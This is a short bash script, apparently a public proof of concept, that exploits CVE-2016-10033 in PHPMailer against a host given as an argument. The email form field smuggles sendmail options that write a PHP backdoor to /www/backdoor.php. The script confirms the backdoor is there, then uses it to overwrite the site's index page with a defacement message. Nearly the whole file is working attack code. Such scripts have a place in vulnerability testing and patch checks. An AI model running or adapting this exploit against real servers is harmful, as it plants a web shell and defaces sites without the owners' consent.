#!/bin/bash
# CVE-2016-10033 exploit by opsxcq
# https://github.com/opsxcq/exploit-CVE-2016-10033

echo '[+] CVE-2016-10033 exploit by opsxcq'

if [ -z "$1" ]
then
    echo '[-] Please inform an host as parameter'
    echo '    Example: ./deface.sh localhost:8080 "Message goes here" '
    exit -1
fi

host=$1
message=$2

echo '[+] Exploiting '$host

curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php $x=fopen("/www/index.php","w");fwrite($x,base64_decode($_GET["cmd"]));fclose($x); ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'


echo '[+] Checking if the backdoor was created on target system'
code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")

if [ "$code" != "200" ]
then
    echo '[-] Target cant be exploited'
    exit -1
else
    echo '[+] Backdoor.php found on remote system'
fi

echo '[+] Placing your message in the server'

p1='<html><head></head><body style="margin: 0px;"><div style="margin: 0;padding: 0;border: 0;height: 100%;background: black;color: green;display: flex;flex-direction: column;justify-content: center;text-align: center;"><h1>'
p2=${message}
p3="</h1></div></body></html>"

cmd=$(echo -ne $p1$p2$p3 | base64)

if ! curl -sq -G --data-urlencode "cmd=$cmd" "http://$host/backdoor.php"  >/dev/null
then
        echo '[-] Connection problens'
        exit -1
fi
echo '[+] Job done, exiting'
